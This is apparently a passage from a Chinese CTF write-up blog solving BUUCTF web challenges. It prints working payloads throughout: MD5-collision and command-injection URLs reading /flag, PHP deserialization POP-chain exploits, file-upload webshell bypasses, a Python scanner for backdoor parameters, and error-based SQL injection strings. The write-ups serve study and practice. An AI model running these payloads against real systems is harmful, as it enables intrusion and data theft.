12a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 md5 的绕过可以用 fastcoll 来生成，具体内容和下载可以看这篇文章：https://www.zeroplace.cn/article.asp?id=886，但是这个工具生成的 url 编码很容易出现黑名单的字符，所以就用这个别的师傅的 payload bp 抓包 repeater 1234GET?img=&amp;cmd=dirPOSTa=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 如果使用 hackbar post 抓包的话要在 bp 里面再次修改 post 内容，post 的内容会被再次编码，导致无法绕过。因为 ls 被禁用了，这里使用 dir，也可以使用 l\\s，效果是一样的 可以看得到了 555.png ， bj.png ， ctf3.jpeg ， index.php ，发现该目录是没有 flag 相关文件的，所以访问上一级，使用 dir \\ 或者 ls \\ 访问上一级，在 burp 中如果使用空格会被识别为其他的参数，所以这里空格用 %20 替换，ls 要用 \\ 隔开 1?img=&amp;cmd=l\\s%20/ 读取 flag， cat \\flag 加入反斜杠 ca\\t%20/f\\l\\a\\g flag # [MRCTF2020]Ezpop 这里重新记录一下反序列化的几个魔术方法 1234567891011__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)__construct(类一执行就开始调用，其作用是拿来初始化一些值。)__toString(在对象当做字符串的时候会被调用。)__wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)__sleep(在对象被序列化的过程中自动调用。sleep要加数组)__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)__call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)__isset(方法用于检测私有属性值是否被设定。当外部使用isset读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)__unset(方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset魔术方法) 查看代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 想要获得 flag 需要用 Modifier 类中的 include 文件包含读取 123456789class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125; 触发 append() 就需要用 __invoke() 触发，触发 invoke() 就需要把 Modifier 类被当作函数调用， __invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用) ，现在得到可以知道 __invoke()-&gt;append-&gt;文件包含 的部分 pop 链 本题的参数是 pop，当 pop 参数为 Show 类的时候，反序列化时会先调用 __wakeup() 过滤，这时候 pop 包含两个参数，分别是 source 和 str ，因为该类中函数 __construct() 有 echo $this-&gt;source ，此时如果 source 数是 new 一个类的话（就是作为一个类的对象），就会调用 __toString() 函数，那就可以把 source 参数 new Show() ，这时候 __toString() 被调用，其中 $this-&gt;str-&gt;source ，就是 Show 类中 source 参数的 str 参数的 source 参数，如果将 str 参数 new Test() ，因为 Test 类中不具有 source 参数，执行 __toString() 函数则会找不到 source 参数，就会调用 __get() 函数，而 __get() 函数中 function 为调用的 p 参数，如果 $function 是个对象，那么则会调用__invoke () 函数，此时如果将 p 参数设置为 Modifier 类，就会执行文件包含输出内容为参数 var，所以在写 payload 的时候修改 var 参数，再进行序列化就可以读出 flag 了，但是直接包含是得不到 flag 的，需要利用 php 伪协议 filter 来读取 flag.php ，最后 base64 解码就可以得到 flag。所以最后的 pop 链为： __construct-&gt;__toString()-&gt;__get()-&gt;__invoke()-&gt;append-&gt;文件包含 构造 payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass Modifier &#123; protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str = new Test();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt; payload 中可以删去源码一些在编写脚本时多余的代码，让 payload 更简洁，但我就没有去删了，感觉这样效率更高。 需要 urlencode 的原因是因为如果不进行编码，最后输出的结果是片段的，不是全部的，会有类似截断导致结果异常，在一些不是 public 定义的变量，反序列化会有一些乱码，直接 urlencode 就不用担心这类情况。 由 payload 得到 url 编码的序列化 1PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFne2M5NmRkNmFhLTA1ZjYtNGUxNi04ZmQyLTFjZTczOGYxNjlkNH0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+ 得到的 base64 拿去解码 拿到 flag，flag # [强网杯 2019] 高明的黑客 下载 www.tar.gz ，得到 3002 个 php 文件。。。 在这写 php 文件中有很多 ?? 符号，例如： system($_GET['jVMcNhK_F'] ?? ' '); ，查了一下，这里记录一下 在 PHP 中， ?? 符号是空合并运算符（Null Coalescing Operator）。它用于简化检查变量是否已设置并且不为 null 的过程。 通常，我们可能会使用三元运算符来检查一个变量是否已设置，并且不为 null，然后提供一个备用值，例如： 1$result = isset($variable) ? $variable : $defaultValue; 使用空合并运算符，可以更简洁地完成相同的操作： 1$result = $variable ?? $defaultValue; 这行代码的意思是，如果 $variable 已经设置并且不为 null，那么 $result 将被赋值为 $variable 的值。如果 $variable 是未设置或者为 null，那么 $result 将被赋值为 $defaultValue 。 在这些代码中，有很多类似一下的代码片段： 12345678$_GET[&#x27;jVMcNhK_F&#x27;] = &#x27; &#x27;;system($_GET[&#x27;jVMcNhK_F&#x27;] ?? &#x27; &#x27;);$_GET[&#x27;tz2aE_IWb&#x27;] = &#x27; &#x27;;echo `&#123;$_GET[&#x27;tz2aE_IWb&#x27;]&#125;`;$_GET[&#x27;cXjHClMPs&#x27;] = &#x27; &#x27;;echo `&#123;$_GET[&#x27;cXjHClMPs&#x27;]&#125;`; 其中 system 和 echo 以及 eval 这三个函数都可以返回值，exec 函数是不回显的，到这一步就还是不知道该怎么做，查看别的师傅的 wp 的时候看到一句话每个 php 文件都有若干个一句话木马，才突然觉得，确实这些代码很想平时写的一句话木马。写脚本测试哪一个 shell 可以连接的吗？ 对于利用 python 写脚本还是比较陌生，用别的师傅的 wp 来学习，这里贴一下学习链接：https://blog.csdn.net/RABCDXB/article/details/115256974 简单的 exp（这不是题解，只是学习用的）： 12345678910111213141516171819import reimport osimport requestsfiles = os.listdir(&#x27;D:/phpstudy/www/test/&#x27;) #获取路径下的所有文件reg = re.compile(r&#x27;(?&lt;=_GET\\[\\&#x27;).*(?=\\&#x27;\\])&#x27;) #设置正则表达式，正则表达式的解释看原文for i in files: #从第一个文件开始 url = &quot;http://127.0.0.1/test/&quot; + i f = open(&quot;D:/phpstudy/www/test/&quot; + i) #打开该文件 data = f.read() #读取 f.close() #关闭 result = reg.findall(data) #从文件中查找GET请求 for j in result: #从第一个GET请求开始 payload = url + &quot;?&quot; + j + &quot;=echo ******&quot; #尝试请求多次路径，并执行命令 print(payload) #返回每次payload html = requests.get(payload) if &quot;******&quot; in html.text: print(payload + &#x27; success&#x27;) #返回成功的payload+success exit(1) 正则表达式 r'(?&lt;=_GET\\[\\').*(?=\\'\\])' 解释 这个正则表达式用于匹配形如 _GET['some_key'] 的字符串，并提取 some_key 部分。让我解释一下每个部分： (?&lt;=_GET\\[') : 这是一个正则表达式的前瞻断言（lookbehind assertion），表示匹配的内容之前必须是 _GET[' ，其中 \\[' 是转义字符，匹配字符 [ 。 .* : 这表示匹配任意数量的字符（包括 0 个字符），直到下一个部分匹配为止。 (?=\\'\\]) : 这是一个正则表达式的后瞻断言（lookahead assertion），表示匹配的内容之后必须是 '] ，其中 \\' 是转义字符，匹配字符 ' 。 综合起来，整个正则表达式的作用是匹配 _GET['some_key'] 格式的字符串，并提取 some_key 部分。 高配版 exp，贴个原文（https://blog.csdn.net/a3320315/article/details/102945940）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import osimport requestsimport reimport threadingimport timeprint(&#x27;开始时间： &#x27; + time.asctime(time.localtime(time.time()))) #一个简单的时间函数，为了美观s1 = threading.Semaphore(100) #设置最大的线程数filePath = r&quot;D:/phpstudy/WWW/hack/src/&quot;os.chdir(filePath) #改变当前工作目录到指定的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath) #得到该目录下所有文件名session = requests.Session() #先实例化一个对象，得到session()为之后的实现代码回显得取创造条件session.keep_alive = False #如果开启keep-alive，则服务端在返回response后不关闭TCP连接，设置连接活跃状态为False，是为了减少无效的连接？def get_content(file): s1.acquire() #我的理解是锁住这些线程资源，具体看https://vimsky.com/examples/usage/python-lock-acquire-method-with-example-02.html print(&#x27;trying &#x27; + file + &#x27; &#x27; + time.asctime(time.localtime(time.time()))) #美观，同时可以对比不加线程和加线程的时间对比 with open(file, encoding=&#x27;utf-8&#x27;) as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall(&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) posts = list(re.findall(&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) data = &#123;&#125; params = &#123;&#125; for m in gets: params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot; for n in posts: data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot; url = &#x27;http://127.0.0.1/hack/src/&#x27; + file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() #关闭请求，释放内存 req.encoding = &#x27;utf-8&#x27; content = req.text #print(content) if &quot;xxxxxx&quot; in content: #查找是否又可利用的参数 flag = 0 for a in gets: req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;) content = req.text req.close() if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;) content = req.text req.close() #关闭请求，释放内存 if &quot;xxxxxx&quot; in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0 param = a else: param = b print(&#x27;找到了利用文件： &#x27;+file+&quot;，利用的参数：%s&quot; %param) print(&#x27;结束时间： &#x27; + time.asctime(time.localtime(time.time()))) s1.release() #对应于之前的多线程打开，此方法释放线程先前获取的锁 for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 记录解释 '\\$_POST\\[\\'(.*?)\\'\\]' ： 这个正则表达式用于匹配 PHP 中 $_POST 超全局数组中的键。下面是对正则表达式的解释： \\$_POST : 匹配 $_POST 字面字符串。由于 $ 和 . 在正则表达式中具有特殊含义，所以需要使用 \\ 来转义它们，以确保匹配字面意义上的字符 $ 和 POST 。 \\[ : 匹配左方括号 [ 。由于 [ 也是正则表达式中的元字符，因此需要使用 \\ 转义。 \\' : 匹配单引号 ' 字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用 \\ 转义。 (.*?) : 这是一个捕获组，用于捕获任意数量的任意字符，但是以非贪婪方式匹配，即尽可能少地匹配字符。 .*? 表示匹配任意字符零次或多次， ? 表示非贪婪模式，即尽可能短地匹配。 \\' : 匹配单引号 ' 字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用 \\ 转义。 \\] : 匹配右方括号 ] 。同样，由于 ] 也是正则表达式中的元字符，因此需要使用 \\ 转义。 综合起来，这个正则表达式用于匹配形如 $_POST['键名'] 的字符串。 记录解释 threading.Thread(target=get_content, args=(i,)) ： 这段代码创建了一个线程对象，该线程对象的目标函数是 get_content ，并传入了一个参数 i 作为参数。 get_content 函数是线程执行的目标函数，而 args=(i,) 是将参数 i 作为元组传递给 get_content 函数。这样，当线程开始执行时，它会调用 get_content(i) 函数。 利用文件： xk0SzyKwfzw.php ，利用的参数： Efa5BVG 接下来就是利用这个文件和参数获取 flag 了 1xk0SzyKwfzw.php?Efa5BVG=ls%20/; ls; 访问当前目录， ls \\; 访问上一级， %20 是 url 编码，这题直接用空格也是可以的，看到 flag 文件直接获取就行 1xk0SzyKwfzw.php?Efa5BVG=cat /flag;","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"buuctf刷题2","slug":"buuctf刷题2","date":"2024-01-24T12:03:11.000Z","updated":"2024-11-08T10:05:32.876Z","comments":true,"path":"2024/01/24/buuctf刷题2/","link":"","permalink":"https://dr4x3zz.github.io/2024/01/24/buuctf%E5%88%B7%E9%A2%982/","excerpt":"# [极客大挑战 2019] Upload","text":"# [极客大挑战 2019] Upload 上传带有一句话木马的文件，好像对内容有检测 这里记录一个知识点：文件幻术头 好像是和一个函数有关 getimagesize () 函数。每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻术。 jpg 对于前面的 16 进制字符是：FFD8FFE000104A464946 png 是：89504E47 gif 是：474946383961 也可以直接把 16 进制字符加在包的首部 所以这里尝试使用文件幻术头来绕过这个内容的检测 这里需要修改一下代码他会检测 &lt;? 所以要使用另一种写法 接下来就是常规的上传抓包改后缀了 经过尝试要使用 phtml 才能成功 这里没有给出存储路径，我们需要猜测存储的路径，然后用蚁剑连接 ok 在 upload 下，蚁剑连接 打开后直接 cat /flag 就可以得到 flag，直接找的话在最外层文件夹下 # [极客大挑战 2019] PHP 进入页面，他说他有一个备份网站的习惯 所以尝试访问网站源码备份文件，这里记录一个知识点 常见的网站源码备份文件后缀： tar.gz，zip，rar，tar 常见的网站源码备份文件名： web，website，backup，back，www，wwwroot，temp 本题是 www.zip 下载后，里面有个 flag.php 一眼假哈哈哈 index.php 里面有一小段有用的代码 重点内容在 class.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 本题利用__construct 构造函数来进行 username 和 password 的对应，之后__wakeup () 让 username 变量等于 guest，下面的比较相等则输出 flag，现在重点是绕过__wakeup () 这个函数 这里记录一个知识点 若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用__wakeup () 成员函数（如果存在的话） 这里记录一下绕过__wakeup () 的一个方法属性个数不匹配 (cve-2016-7124)： 影响范围： PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 在反序列化的过程中，会先调用__wakeup () 方法在进行 unserilize (), 但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，__wakeup () 的执行会被跳过 知道了这个我们就尝试修改属性个数来绕过__wakeup () exp： 123456789&lt;?phpclass Name&#123; private $username = &#x27;admin&#x27;; private $password = 100;&#125;$select = new Name();$res = serialize(@$select);echo $res;?&gt; 输出后的内容为： 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 修改个数 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 这里修改个数还是不行，我网上找了一会，发现这个变量为 private private 声明的字段为私有字段，只在声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 \\0 的前缀。字符串长度也包括所加前缀的长度，于是修改 payload 为 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; ok 拿到 flag flag # [ACTF2020 新生赛] BackupFile 1 这道题目的文件就是备份文件的意思，使用 dirsearch 扫描，省去猜测文件名的时间 可以看到有一个 index.php.bak，下载下来 用记事本打开 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 记录一个知识点 在 php 中：为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如 a=123 和 b=123admin456 进行比较时。则 b 只会截取前面的整数部分。即 b 转化成 123。 所以这道题就很简单了只需要让 key=123 就好了 flag # [RoarCTF 2019]Easy Calc f12 可以看到还有一个 calc.php 访问一下 写一下 payload 1calc.php? num=2;var_dump(scandir(chr(47))) 这段 payload? 和 num 之间有个空格，删去的话就无法访问，这是用来绕过 waf（web 防火墙），参考链接：https://blog.csdn.net/weixin_45642610/article/details/112545583 解答我也抄一下：这是 php 的机制，在传进 php 代码的 url 时，一些字符会被忽略或变成_。因为 php 一般是这样 $_GET['num'] 获取 url 传进来的参数，当有一些奇怪的字符和参数写在一起时，如 %[num%id ，它会变成 $_GET['num_id'] 。所以在 num 前加个空格可以绕过 waf 并且 php 会把它当成正常 num 使用，此时并不是’num’而是‘num’。 看的我还是云里雾里的。。。 var_dump () 用来打印 scandir () 用来获取目录文件 chr (47) 是 / 的 ASCII 编码，因为 / 被过滤了所以要用 ASCII 可以猜测到 flag 应该是在 f1agg 里的 这里做一个小记录 对于 scandir (’.’) 和 scandir (chr (47)) 的范围 前者应该是当前目录下的所有文件的名称，后者像是上一级的目录 payload： 1calc.php? num=2;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) . 是 php 的连字符 chr () 里面都是 ASCII 码 47 是 \\ 102 是 f 49 是 1 97 是 a 103 是 g flag # [极客大挑战 2019] BuyFlag f12 查看源码，这就是弱比较吧，我直接 post password=404adsad 来绕过这个 ==，但是失败了，是我想得太简单了 12345678910 ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125; 这里做了很多尝试，抓包后发现，cookie 有个 user=0，不改动的话一直都是 Only Cuit’s students can buy the FLAG 把 user 改为 1，就是学生身份了 这样再次 post 它提示我 Pay for the flag!hacker! 应该是说我需要有 100000000 money 上面的代码说了 ~~~post money and password~~~ 所以也直接 post 然后告诉我 Nember lenth is too long 这里用科学计数法 1e9 payload： 1password=404asdb&amp;money=1e9 成功得到 flag flag # [MRCTF2020] 你传你🐎呢 尝试上传一句话木马图片，抓包修改后缀的方法失败了 尝试使用.htaccess 内容为 123&lt;FilesMatch &quot;muma&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 意思就是把文件名叫做 muma 的文件当成 php 文件解析 这下就先上传.htaccess 在上传 muma.jpg 这里记得抓包修改 Content-Type 为 image/png 没有修改的话上传会失败 上传 muma.jpg 有路径回显，蚁剑连接 在最高一级目录里可以找到 flag flag # [HCTF 2018]admin 第一种：这一题的解法很多，因为是弱口令，所以可以用 bp 直接爆破 爆破得到密码是 123 登录就可以得到 flag 第二种：留一下大佬的做法 flask session 伪造 https://blog.csdn.net/weixin_45642610/article/details/112685368 我下载 flask 一直报错，下次再尝试 # [ZJCTF 2019]NiZhuanSiWei 第一个绕过 1if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;)) 要求我们上传一个 txt 内容还需是 welcome to the zjctf 可以使用 data 伪协议写进去 payload： 1?text=data://text/plain,welcome to the zjctf 这里最好把 welcome to the zjctf 转成 base64 上传，不然有可能会被过滤，但是这道题没有，我就不转了 接下来第二个绕过 12345678if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125; preg_match 正则过滤了 flag，看了大佬的做法是利用 php://filter 伪协议来读取 useless.php payload： 1?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php base64 解码得到 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; exp： 123456789101112131415&lt;?php class Flag&#123; //flag.php public $file = &quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125;$a = new Flag();echo serialize($a);?&gt; payload： 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最后在 f12 里找到 flag flag # [极客大挑战 2019] HardSQL 这题过滤了 union 和空格，payload 里面不能有空格，有空格页面就会显示 你可别被我逮住了，臭弟弟 在尝试找注入点的时候发现这道题目报错会回显，猜测这题可以用报错注入 查询当前数据库 payload： 1?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select (database())),0x7e),1))%23 # 符号也被过滤了好像，反正我是失效了，这里用 %23 就是 url 编码的 # 爆表名 1?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1)%23 爆字段 1?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1)%23 把 id、username 和 password 爆出来因为限制了所以搭配 right 函数使用吧，substr 试了一下也被过滤了 id=1，username 是 flag，贴出来的 payload 就不要 id 和 username 了，占位置还没有用的信息，直接爆 password payload： 1?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((password)))from(H4rDsq1)),0x7e),1))%23 ![](屏幕截图 2024-01-26 175001.png) flag{d7470798-d6bf-4a95-83c5-c7 payload： 1?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23 f-4a95-83c5-c74172d32982} 拼接一下 flag 这里写的时候每个函数都要用 () 围起来，不围起来就会出错。。。 # [MRCTF2020]Ez_bypass 12345678910111213141516171819202122232425262728293031323334353637383940I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first 数组绕过 id 和 gg 的比较，然后 passwd=1234567 加上任意字母就能绕过 payload: 123url?id[]=1&amp;gg[]=2POST datapasswd=1234567asd 就能拿到 flag flag # [网鼎杯 2020 青龙组] AreUSerialz 参考大佬：https://blog.csdn.net/m0_46246804/article/details/108746253 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; is_valid() 函数是对于传入的字符串进行判断，确保每一个字符 ASCII 值都在 32-125 之间，就是判断这个字符串每一个字符可不可以打印，可以打印返回 true 123456if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; 